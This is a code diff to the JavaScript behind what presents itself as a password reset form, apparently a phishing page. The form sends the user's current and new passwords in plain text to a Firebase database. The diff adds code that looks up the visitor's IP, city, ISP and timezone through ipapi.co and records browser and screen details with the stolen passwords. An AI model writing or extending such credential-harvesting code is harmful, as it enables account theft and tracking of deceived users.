@@ -6,7 +6,7 @@ import {
     push
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-// Replace with your Firebase Config
+// Firebase Config
 const firebaseConfig = {
     apiKey: "AIzaSyBRxp7bdCJk6aCGNjz2YqGRZ7HvzknUoaY",
     authDomain: "manas-in-87599.firebaseapp.com",
@@ -18,34 +18,70 @@ const firebaseConfig = {
     measurementId: "G-ZL5LHJQ8MT"
 };
 
-// Initialize Firebase
+// Init Firebase
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
+
+// 🌐 Get IP + Location
+async function getIPData() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        return {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            isp: data.org,
+            timezone: data.timezone
+        };
+    } catch (error) {
+        return {
+            ip: "unknown"
+        };
+    }
+}
 
 // Button
 const btn = document.querySelector("button");
 
-btn.addEventListener("click", (e) => {
+btn.addEventListener("click", async (e) => {
     e.preventDefault();
 
-    const currentPassword = document.querySelectorAll("input")[0].value;
-    const newPassword = document.querySelectorAll("input")[1].value;
-    const confirmPassword = document.querySelectorAll("input")[2].value;
+    const inputs = document.querySelectorAll("input");
+
+    const currentPassword = inputs[0].value;
+    const newPassword = inputs[1].value;
+    const confirmPassword = inputs[2].value;
 
     if (newPassword !== confirmPassword) {
         alert("Passwords do not match.");
         return;
     }
 
-    push(ref(database, "password_resets"), {
-        currentPassword,
-        newPassword,
-        createdAt: new Date().toISOString()
-    })
-    .then(() => {
+    try {
+        // Get IP info
+        const ipData = await getIPData();
+
+        // Device info
+        const deviceData = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`
+        };
+
+        // Save to Firebase
+        await push(ref(database, "password_resets"), {
+            currentPassword,
+            newPassword,
+            ...ipData,
+            ...deviceData,
+            createdAt: new Date().toISOString()
+        });
+
         alert("Password reset request saved.");
-    })
-    .catch((error) => {
+    } catch (error) {
         alert(error.message);
-    });
+    }
 });
